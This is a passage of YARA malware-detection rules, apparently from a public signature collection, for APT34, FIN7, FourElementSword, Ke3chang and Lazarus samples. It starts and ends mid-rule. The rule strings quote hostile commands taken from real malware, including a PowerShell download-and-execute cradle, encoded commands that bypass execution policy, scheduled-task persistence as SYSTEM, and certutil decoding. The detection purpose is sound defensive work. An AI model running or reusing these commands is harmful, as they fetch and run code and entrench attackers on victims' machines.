      reference = "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
      date = "2017-06-07"
      hash1 = "e3494fd2cc7e9e02cff76841630892e4baed34a3e1ef2b9ae4e2608f9a4d7be9"
   strings:
      $x1 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $x2 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $x3 = "%d is an x86 process (can't inject x64 content)" fullword ascii

      $s1 = "Could not open process token: %d (%u)" fullword ascii
      $s2 = "0fd00b.dll" fullword ascii
      $s3 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
      $s4 = "Could not connect to pipe (%s): %d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and ( 1 of ($x*) or 3 of them ) )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-12-07
   Identifier: APT 34
   Reference: https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule APT34_Malware_HTA {
   meta:
      description = "Detects APT 34 malware"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
      date = "2017-12-07"
      hash1 = "f6fa94cc8efea0dbd7d4d4ca4cf85ac6da97ee5cf0c59d16a6aafccd2b9d8b9a"
   strings:
      $x1 = "WshShell.run \"cmd.exe /C C:\\ProgramData\\" ascii
      $x2 = ".bat&ping 127.0.0.1 -n 6 > nul&wscript  /b" ascii
      $x3 = "cmd.exe /C certutil -f  -decode C:\\ProgramData\\" ascii
      $x4 = "a.WriteLine(\"set Shell0 = CreateObject(" ascii
      $x5 = "& vbCrLf & \"Shell0.run" ascii

      $s1 = "<title>Blog.tkacprow.pl: HTA Hello World!</title>" fullword ascii
      $s2 = "<body onload=\"test()\">" fullword ascii
   condition:
      filesize < 60KB and ( 1 of ($x*) or all of ($s*) )
}

rule APT34_Malware_Exeruner {
   meta:
      description = "Detects APT 34 malware"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
      date = "2017-12-07"
      hash1 = "c75c85acf0e0092d688a605778425ba4cb2a57878925eee3dc0f4dd8d636a27a"
   strings:
      $x1 = "\\obj\\Debug\\exeruner.pdb" ascii
      $x2 = "\"wscript.shell`\")`nShell0.run" wide
      $x3 = "powershell.exe -exec bypass -enc \" + ${global:$http_ag} +" wide
      $x4 = "/c powershell -exec bypass -window hidden -nologo -command " fullword wide
      $x5 = "\\UpdateTasks\\JavaUpdatesTasksHosts\\" wide
      $x6 = "schtasks /create /F /ru SYSTEM /sc minute /mo 1 /tn" wide
      $x7 = "UpdateChecker.ps1 & ping 127.0.0.1" wide
      $s8 = "exeruner.exe" fullword wide
      $s9 = "${global:$address1} = $env:ProgramData + \"\\Windows\\Microsoft\\java\";" fullword wide
      $s10 = "C:\\ProgramData\\Windows\\Microsoft\\java" fullword wide
      $s11 = "function runByVBS" fullword wide
      $s12 = "$84e31856-683b-41c0-81dd-a02d8b795026" fullword ascii
      $s13 = "${global:$dns_ag} = \"aQBmACAAKAAoAEcAZQB0AC0AVwBtAGk" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2018-08-01
   Identifier: FIN7
   Reference: https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html
*/

import "pe"

/* Rule Set ----------------------------------------------------------------- */

rule APT_FIN7_Strings_Aug18_1 {
   meta:
      description = "Detects strings from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "b6354e46af0d69b6998dbed2fceae60a3b207584e08179748e65511d45849b00"
   strings:
      $s1 = "&&call %a01%%a02% /e:jscript" ascii
      $s2 = "wscript.exe //b /e:jscript %TEMP%" ascii
      $s3 = " w=wsc@ript /b " ascii
      $s4 = "@echo %w:@=%|cmd" ascii
      $s5 = " & wscript //b /e:jscript"
   condition:
      1 of them
}

rule APT_FIN7_Sample_Aug18_2 {
   meta:
      description = "Detects FIN7 malware sample"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "1513c7630c981e4b1d0d5a55809166721df4f87bb0fac2d2b8ff6afae187f01d"
   strings:
      $x1 = "Description: C:\\Users\\oleg\\Desktop\\" wide
      $x2 = "/*|*| *  Copyright 2016 Microsoft, Industries.|*| *  All rights reserved.|*|" ascii
      $x3 = "32, 40, 102, 105, 108, 101, 95, 112, 97, 116, 104, 41, 41, 32" ascii
      $x4 = "83, 108, 101, 101, 112, 40, 51, 48, 48, 48, 41, 59, 102, 115" ascii
      $x5 = "80, 80, 68, 65, 84, 65, 37, 34, 41, 44, 115, 104, 101, 108, 108" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and 1 of them
}

rule APT_FIN7_MalDoc_Aug18_1 {
   meta:
      description = "Detects malicious Doc from FIN7 campaign"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "9c12591c850a2d5355be0ed9b3891ccb3f42e37eaf979ae545f2f008b5d124d6"
   strings:
      $s1 = "<photoshop:LayerText>If this document was downloaded from your email, please click  \"Enable editing\" from the yellow bar above" ascii
   condition:
      filesize < 800KB and 1 of them
}

rule APT_FIN7_Sample_Aug18_1 {
   meta:
      description = "Detects FIN7 samples mentioned in FireEye report"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "a1e95ac1bb684186e9fb5c67f75c7c26ddc8b18ebfdaf061742ddf1675e17d55"
      hash2 = "dc645aae5d283fa175cf463a19615ed4d16b1d5238686245574d8a6a8b0fc8fa"
      hash3 = "eebbce171dab636c5ac0bf0fd14da0e216758b19c0ce2e5c572d7e6642d36d3d"
   strings:
      $s1 = "\\par var console=\\{\\};console.log=function()\\{\\};" fullword ascii
      $s2 = "616e64792d7063" ascii /* hex encoded string 'andy-pc' */

      $x1 = "0043003a005c00550073006500720073005c0061006e00640079005c004400650073006b0074006f0070005c0075006e00700072006f0074006500630074" ascii /* hex encoded string 'C:\Users\andy\Desktop\unprotect' */
      $x2 = "780065006300750074006500280022004f006e0020004500720072006f007200200052006500730075006d00650020004e006500780074003a0073006500" ascii /* hex encoded string 'xecute("On Error Resume Next:se' */
      $x3 = "\\par \\tab \\tab \\tab sh.Run \"powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File \" & pToPSCb, 0, False" fullword ascii
      $x4 = "002e006c006e006b002d00000043003a005c00550073006500720073005c007400650073007400610064006d0069006e002e0054004500530054005c0044" ascii /* hex encoded string '.lnk-C:\Users\testadmin.TEST\D' */
      $x5 = "005c00550073006500720073005c005400450053005400410044007e0031002e005400450053005c0041007000700044006100740061005c004c006f0063" ascii /* hex encoded string '\Users\TESTAD~1.TES\AppData\Loc' */
      $x6 = "6c00690063006100740069006f006e002200220029003a00650078006500630075007400650020007700700072006f0074006500630074002e0041006300" ascii /* hex encoded string 'lication""):execute wprotect.Ac' */
      $x7 = "7374656d33325c6d736874612e657865000023002e002e005c002e002e005c002e002e005c00570069006e0064006f00770073005c005300790073007400" ascii /* hex encoded string 'stem32\mshta.exe#..\..\..\Windows\Syst' */
      $x8 = "\\par \\tab \\tab sh.Run \"%comspec% /c tasklist >\"\"\" & tpath & \"\"\" 2>&1\", 0, true" fullword ascii
      $x9 = "00720079007b006500760061006c0028002700770061006c006c003d004700650074004f0062006a0065006300740028005c005c0027005c005c00270027" ascii /* hex encoded string 'ry{eval('wall=GetObject(\\'\\''' */
      $x10 = "006e00640079005c004400650073006b0074006f0070005c0075006e006c006f0063006b002e0064006f0063002e006c006e006b" ascii /* hex encoded string 'ndy\Desktop\unlock.doc.lnk' */
   condition:
      uint16(0) == 0x5c7b and filesize < 3000KB and ( 1 of ($x*) or 2 of them )
}

rule APT_FIN7_EXE_Sample_Aug18_1 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "7f16cbe7aa1fbc5b8a95f9d123f45b7e3da144cb88db6e1da3eca38cf88660cb"
   strings:
      $s1 = "Manche Enterprises Limited0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}

rule APT_FIN7_EXE_Sample_Aug18_2 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "60cd98fc4cb2ae474e9eab81cd34fd3c3f638ad77e4f5d5c82ca46f3471c3020"
   strings:
      $s1 = "constructor or from DllMain." fullword ascii
      $s2 = "Network Software Ltd0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule APT_FIN7_EXE_Sample_Aug18_3 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "995b90281774798a376db67f906a126257d314efc21b03768941f2f819cf61a6"
   strings:
      $s1 = "cvzdfhtjkdhbfszngjdng" fullword ascii
      $s2 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and 1 of them
}

rule APT_FIN7_EXE_Sample_Aug18_4 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "4b5405fc253ed3a89c770096a13d90648eac10a7fb12980e587f73483a07aa4c"
   strings:
      $s1 = "c:\\file.dat" fullword wide
      $s2 = "constructor or from DllMain." fullword ascii
      $s3 = "lineGetCallIDs" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule APT_FIN7_EXE_Sample_Aug18_5 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "7789a3d7d05c30b4efaf3f2f5811804daa56d78a9a660968a4f1f9a78a9108a0"
   strings:
      $s1 = "x0=%d, y0=%d, x1=%d, y1=%d" fullword ascii
      $s3 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule APT_FIN7_EXE_Sample_Aug18_6 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "1439d301d931c8c4b00717b9057b23f0eb50049916a48773b17397135194424a"
   strings:
      $s1 = "coreServiceShell.exe" fullword ascii
      $s2 = "PtSessionAgent.exe" fullword ascii
      $s3 = "TiniMetI.exe" fullword ascii
      $s4 = "PwmSvc.exe" fullword ascii
      $s5 = "uiSeAgnt.exe" fullword ascii
      $s7 = "LHOST:" fullword ascii
      $s8 = "TRANSPORT:" fullword ascii
      $s9 = "LPORT:" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and (
         pe.exports("TiniStart") or
         4 of them
      )
}

rule APT_FIN7_EXE_Sample_Aug18_7 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "ce8ce35f85406cd7241c6cc402431445fa1b5a55c548cca2ea30eeb4a423b6f0"
   strings:
      $s1 = "libpng version" fullword ascii
      $s2 = "sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule APT_FIN7_EXE_Sample_Aug18_8 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "d8bda53d7f2f1e4e442a0e1c30a20d6b0ac9c6880947f5dd36f78e4378b20c5c"
   strings:
      $s1 = "GetL3st3rr" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule APT_FIN7_EXE_Sample_Aug18_10 {
   meta:
      description = "Detects sample from FIN7 report in August 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "8cc02b721683f8b880c8d086ed055006dcf6155a6cd19435f74dd9296b74f5fc"
   strings:
      /* "Copyright 1 - 19" */
      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70
               00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43
               00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74
               00 20 00 31 00 20 00 2D 00 20 00 31 00 39 00 }
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them
}

rule APT_FIN7_Sample_EXE_Aug18_1 {
   meta:
      description = "Detects FIN7 Sample"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
      date = "2018-08-01"
      hash1 = "608003c2165b0954f396d835882479f2504648892d0393f567e4a4aa90659bf9"
      hash2 = "deb62514704852ccd9171d40877c59031f268db917c23d00a2f0113dab79aa3b"
      hash3 = "16de81428a034c7b2636c4a875809ab62c9eefcd326b50c3e629df3b141cc32b"
      hash4 = "3937abdd1fd63587022ed540a31c58c87c2080cdec51dd24af3201a6310059d4"
      hash5 = "7789a3d7d05c30b4efaf3f2f5811804daa56d78a9a660968a4f1f9a78a9108a0"
   strings:
      $s1 = "x0=%d, y0=%d, x1=%d, y1=%d" fullword ascii
      $s2 = "dx=%d, dy=%d" fullword ascii
      $s3 = "Error with JP2H box size" fullword ascii

      $co1 = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
               00 00 00 00 00 00 00 00 00 00 00 2E 63 6F 64 65
               00 00 00 }
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB
      and all of ($s*)
      and $co1 at 0x015D
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-04
   Identifier: FIN7
   Reference: https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor
*/

/* Rule Set ----------------------------------------------------------------- */

rule FIN7_Dropper_Aug17 {
   meta:
      description = "Detects Word Dropper from Proofpoint FIN7 Report"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor"
      date = "2017-08-04"
      hash1 = "c91642c0a5a8781fff9fd400bff85b6715c96d8e17e2d2390c1771c683c7ead9"
      hash2 = "cf86c7a92451dca1ebb76ebd3e469f3fa0d9b376487ee6d07ae57ab1b65a86f8"
   strings:
      $x1 = "tpircsj:e/ b// exe.tpircsw\" rt/" fullword ascii

      $s1 = "Scripting.FileSystemObject$" fullword ascii
      $s2 = "PROJECT.THISDOCUMENT.AUTOOPEN" fullword wide
      $s3 = "Project.ThisDocument.AutoOpen" fullword wide
      $s4 = "\\system3" fullword ascii
      $s5 = "ShellV" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 700KB and 1 of ($x*) or all of ($s*) )
}

rule FIN7_Backdoor_Aug17 {
   meta:
      description = "Detects Word Dropper from Proofpoint FIN7 Report"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor"
      date = "2017-08-04"
   strings:
      $x1 = "wscript.exe //b /e:jscript C:\\Users\\" ascii
      $x2 = "wscript.exe /b /e:jscript C:\\Users\\" ascii
      $x3 = "schtasks /Create /f /tn \"GoogleUpdateTaskMachineSystem\" /tr \"wscript.exe" ascii nocase
      $x4 = "schtasks /Delete /F /TN \"\"GoogleUpdateTaskMachineCore" ascii nocase
      $x5 = "schtasks /Delete /F /TN \"GoogleUpdateTaskMachineCore" ascii nocase
      $x6 = "wscript.exe //b /e:jscript %TMP%\\debug.txt" ascii

      $s1 = "/?page=wait" fullword ascii

      $a1 = "autoit3.exe" fullword ascii
      $a2 = "dumpcap.exe" fullword ascii
      $a3 = "tshark.exe" fullword ascii
      $a4 = "prl_cc.exe" fullword ascii

      $v1 = "vmware" fullword ascii
      $v2 = "PCI\\\\VEN_80EE&DEV_CAFE" fullword ascii
      $v3 = "VMWVMCIHOSTDEV" fullword ascii

      $c1 = "apowershell" fullword ascii
      $c2 = "wpowershell" fullword ascii
      $c3 = "get_passwords" fullword ascii
      $c4 = "kill_process" fullword ascii
      $c5 = "get_screen" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and
         (
            1 of ($x*) or
            all of ($a*) or
            all of ($v*) or
            3 of ($c*)
         )
      ) or 5 of them
}
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-04-18
	Identifier: FourElementSword
	Reference: https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/
*/

/* Rule Set ----------------------------------------------------------------- */

rule FourElementSword_Config_File {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27"
	strings:
		$s0 = "01,,hccutils.dll,2" fullword ascii
		$s1 = "RegisterDlls=OurDll" fullword ascii
		$s2 = "[OurDll]" fullword ascii
		$s3 = "[DefaultInstall]" fullword ascii /* Goodware String - occured 16 times */
		$s4 = "Signature=\"$Windows NT$\"" fullword ascii /* Goodware String - occured 26 times */
	condition:
		4 of them
}

rule FourElementSword_T9000 {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c"
	strings:
		$x1 = "D:\\WORK\\T9000\\" ascii
		$x2 = "%s\\temp\\HHHH.dat" fullword wide

		$s1 = "Elevate.dll" fullword wide
		$s2 = "ResN32.dll" fullword wide
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword wide
		$s4 = "igfxtray.exe" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*) ) or ( all of them )
}

rule FourElementSword_32DLL {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "7a200c4df99887991c638fe625d07a4a3fc2bdc887112437752b3df5c8da79b6"
	strings:
		$x1 = "%temp%\\tmp092.tmp" fullword ascii

		$s1 = "\\System32\\ctfmon.exe" fullword ascii
		$s2 = "%SystemRoot%\\System32\\" fullword ascii
		$s3 = "32.dll" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 660KB and $x1 ) or ( all of them )
}

rule FourElementSword_Keyainst_EXE {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "cf717a646a015ee72f965488f8df2dd3c36c4714ccc755c295645fe8d150d082"
	strings:
		$x1 = "C:\\ProgramData\\Keyainst.exe" fullword ascii

		$s1 = "ShellExecuteA" fullword ascii /* Goodware String - occured 266 times */
		$s2 = "GetStartupInfoA" fullword ascii /* Goodware String - occured 2573 times */
		$s3 = "SHELL32.dll" fullword ascii /* Goodware String - occured 3233 times */
	condition:
		( uint16(0) == 0x5a4d and filesize < 48KB and $x1 ) or ( all of them )
}

rule FourElementSword_ElevateDLL_2 {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95"
	strings:
		$s1 = "Elevate.dll" fullword ascii
		$s2 = "GetSomeF" fullword ascii
		$s3 = "GetNativeSystemInfo" fullword ascii /* Goodware String - occured 530 times */
	condition:
		( uint16(0) == 0x5a4d and filesize < 25KB and $s1 ) or ( all of them )
}

rule FourElementSword_fslapi_dll_gui {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "2a6ef9dde178c4afe32fe676ff864162f104d85fac2439986de32366625dc083"
	strings:
		$s1 = "fslapi.dll.gui" fullword wide
		$s2 = "ImmGetDefaultIMEWnd" fullword ascii /* Goodware String - occured 64 times */
		$s3 = "RichOX" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 12KB and all of them )
}

rule FourElementSword_PowerShell_Start {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "9b6053e784c5762fdb9931f9064ba6e52c26c2d4b09efd6ff13ca87bbb33c692"
	strings:
		$s0 = "start /min powershell C:\\\\ProgramData\\\\wget.exe" ascii
		$s1 = "start /min powershell C:\\\\ProgramData\\\\iuso.exe" fullword ascii
	condition:
		1 of them
}

rule FourElementSword_ResN32DLL {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		hash = "bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f"
	strings:
		$s1 = "\\Release\\BypassUAC.pdb" ascii
		$s2 = "\\ResN32.dll" fullword wide
		$s3 = "Eupdate" fullword wide
	condition:
		all of them
}

/* Super Rules ------------------------------------------------------------- */

rule FourElementSword_ElevateDLL {
	meta:
		description = "Detects FourElementSword Malware"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		date = "2016-04-18"
		super_rule = 1
		hash1 = "3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9"
		hash2 = "5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c"
	strings:
		$x1 = "Elevate.dll" fullword wide
		$x2 = "ResN32.dll" fullword wide

		$s1 = "Kingsoft\\Antivirus" fullword wide
		$s2 = "KasperskyLab\\protected" fullword wide
		$s3 = "Sophos" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*) and all of ($s*) )
		or ( all of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-25
   Identifier: Greenbug Malware
*/

import "pe"

/* Rule Set ----------------------------------------------------------------- */



/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-11-26
   Identifier: Greenbug
   Reference: http://www.clearskysec.com/greenbug/
*/

/* Rule Set ----------------------------------------------------------------- */
 
rule APT_KE3CHANG_TMPFILE: APT KE3CHANG TMPFILE {
   meta:
      description = "Detects Strings left in TMP Files created by K3CHANG Backdoor Ketrican"
      author = "Markus Neis, Swisscom"
      reference = "https://app.any.run/tasks/a96f4f9d-c27d-490b-b5d3-e3be0a1c93e9/"
      date = "2020-06-18"
      hash1 = "4ef11e84d5203c0c425d1a76d4bf579883d40577c2e781cdccc2cc4c8a8d346f"
   strings:
      $pps1 = "PSParentPath             : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USE" fullword ascii
      $pps2 = "PSPath                   : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USE" fullword ascii
      $psp1 = ": Microsoft.PowerShell.Core\\Registry" ascii

      $s4 = "PSChildName  : PhishingFilter" fullword ascii
      $s1 = "DisableFirstRunCustomize : 2" fullword ascii
      $s7 = "PSChildName  : 3" fullword ascii
      $s8 = "2500         : 3" fullword ascii

   condition:
      uint16(0) == 0x5350 and filesize < 1KB and $psp1 and 1 of ($pps*) and 1 of ($s*)
}

rule APT_MAL_Ke3chang_Ketrican_Jun20_1 {
   meta:
      description = "Detects Ketrican malware"
      author = "Florian Roth"
      reference = "BfV Cyber-Brief Nr. 01/2020"
      date = "2020-06-18"
      hash1 = "02ea0bc17875ab403c05b50205389065283c59e01de55e68cee4cf340ecea046"
      hash2 = "f3efa600b2fa1c3c85f904a300fec56104d2caaabbb39a50a28f60e0fdb1df39"
   strings:
      $xc1 = { 00 59 89 85 D4 FB FF FF 8B 85 D4 FB FF FF 89 45
               FC 68 E0 58 40 00 8F 45 FC E9 }

      $op1 = { 6a 53 58 66 89 85 24 ff ff ff 6a 79 58 66 89 85 }
      $op2 = { 8d 45 bc 50 53 53 6a 1c 8d 85 10 ff ff ff 50 ff }
   condition:
      uint16(0) == 0x5a4d and
      filesize < 300KB and
      1 of ($x*) or 2 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-12-20
   Identifier: Lazarus malware
   Reference: https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new
*/

/* Rule Set ----------------------------------------------------------------- */

rule Lazarus_Dec_17_1 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20"
      hash1 = "d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48"
   strings:
      $s1 = "::DataSpace/Storage/MSCompressed/Transform/" ascii
      $s2 = "HHA Version 4." ascii
      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F
              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 }
      $s4 = "bUEeYE" fullword ascii
   condition:
      uint16(0) == 0x5449 and filesize < 4000KB and all of them
}

rule Lazarus_Dec_17_2 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/8U6fY2"
      date = "2017-12-20"
      hash1 = "cbebafb2f4d77967ffb1a74aac09633b5af616046f31dddf899019ba78a55411"
      hash2 = "9ca3e56dcb2d1b92e88a0d09d8cab2207ee6d1f55bada744ef81e8b8cf155453"
   strings:
      $s1 = "SkypeSetup.exe" fullword wide
      $s2 = "%s\\SkypeSetup.exe" fullword ascii
      $s3 = "Skype Technologies S.A." fullword wide

      $a1 = "Microsoft Code Signing PCA" ascii wide
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and (
        all of ($s*) and not $a1
      )
}

rule Lazarus_Dec_17_4 {
   meta:
